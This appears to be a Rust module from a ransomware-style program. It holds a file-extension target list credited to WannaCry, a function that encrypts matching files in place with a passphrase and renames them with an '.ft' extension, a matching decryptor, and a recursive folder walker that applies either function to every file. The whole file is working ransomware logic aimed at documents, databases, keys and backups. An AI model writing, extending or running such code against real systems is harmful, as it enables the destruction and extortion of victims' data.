use std::{
    ffi::OsStr,
    fs::{self, DirEntry},
    io::{self, Error},
    path::Path,
};

use crate::cipher::{decrypt, encrypt};

pub type CallbackFn = dyn Fn(&DirEntry, &str) -> io::Result<u64>;

// Taken from https://gist.github.com/xpn/facb5692980c14df272b16a4ee6a29d5
pub const WANNACRY_EXTENSIONS: &[&str] = &[
    "der", "pfx", "key", "crt", "csr", "p12", "pem", "odt", "ott", "sxw", "stw", "uot", "3ds",
    "max", "3dm", "ods", "ots", "sxc", "stc", "dif", "slk", "wb2", "odp", "otp", "sxd", "std",
    "uop", "odg", "otg", "sxm", "mml", "lay", "lay6", "asc", "sqlite3", "sqlitedb", "sql", "accdb",
    "mdb", "db", "dbf", "odb", "frm", "myd", "myi", "ibd", "mdf", "ldf", "sln", "suo", "cs", "c",
    "cpp", "pas", "h", "asm", "js", "cmd", "bat", "ps1", "vbs", "vb", "pl", "dip", "dch", "sch",
    "brd", "jsp", "php", "asp", "rb", "java", "jar", "class", "sh", "mp3", "wav", "swf", "fla",
    "wmv", "mpg", "vob", "mpeg", "asf", "avi", "mov", "mp4", "3gp", "mkv", "3g2", "flv", "wma",
    "mid", "m3u", "m4u", "djvu", "svg", "ai", "psd", "nef", "tiff", "tif", "cgm", "raw", "gif",
    "png", "bmp", "jpg", "jpeg", "vcd", "iso", "backup", "zip", "rar", "7z", "gz", "tgz", "tar",
    "bak", "tbk", "bz2", "PAQ", "ARC", "aes", "gpg", "vmx", "vmdk", "vdi", "sldm", "sldx", "sti",
    "sxi", "602", "hwp", "snt", "onetoc2", "dwg", "pdf", "wk1", "wks", "123", "rtf", "csv", "txt",
    "vsdx", "vsd", "edb", "eml", "msg", "ost", "pst", "potm", "potx", "ppam", "ppsx", "ppsm",
    "pps", "pot", "pptm", "pptx", "ppt", "xltm", "xltx", "xlc", "xlm", "xlt", "xlw", "xlsb",
    "xlsm", "xlsx", "xls", "dotx", "dotm", "dot", "docm", "docb", "docx", "doc",
];

pub fn is_wannacry_extension(ext: &str) -> bool {
    WANNACRY_EXTENSIONS
        .iter()
        .any(|&e| e.eq_ignore_ascii_case(ext))
}

pub fn encrypt_file(entry: &DirEntry, passphrase: &str) -> io::Result<u64> {
    let path = entry.path();
    if !path.is_file() {
        return Ok(0);
    }

    if let Some(ext) = path.extension() {
        if let Some(ext) = ext.to_str() {
            if is_wannacry_extension(ext) {
                let file = fs::read(&path)?;
                let encrypted_file = encrypt(&file, passphrase)
                    .map_err(|e| Error::new(io::ErrorKind::Other, e.to_string()))?;
                fs::write(&path, encrypted_file)?;
                let mut new_path = path.clone();
                new_path.add_extension("ft");
                log::info!("Encrypted {:?}", new_path);
                fs::rename(&path, new_path)?;
                return Ok(1);
            }
        }
    }
    Ok(0)
}

pub fn decrypt_file(entry: &DirEntry, passphrase: &str) -> io::Result<u64> {
    let path = entry.path();
    if !path.is_file() {
        return Ok(0);
    }

    if let Some(ext) = path.extension() {
        if ext == OsStr::new("ft") {
            let file = fs::read(&path)?;
            let decrypted_file = decrypt(&file, passphrase).map_err(|e| {
                Error::new(
                    io::ErrorKind::Other,
                    format!("{}: Cannot decrypt {}", e, path.to_string_lossy()),
                )
            })?;
            fs::write(&path, decrypted_file)?;
            let mut new_path = path.clone();
            new_path.set_extension("");
            log::info!("Decrypted {:?}", new_path);
            fs::rename(&path, new_path)?;
            return Ok(1);
        }
    }

    Ok(0)
}

pub fn visit_folder(dir: &Path, cb: &CallbackFn, passphrase: &str) -> io::Result<u64> {
    let mut counter = 0;

    if !dir.is_dir() {
        return Ok(counter);
    }

    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        if path.is_dir() {
            counter = visit_folder(&path, cb, passphrase)?;
        } else {
            match cb(&entry, passphrase) {
                Ok(num) => counter += num,
                Err(e) => log::warn!("{}", e.to_string()),
            }
        }
    }

    Ok(counter)
}
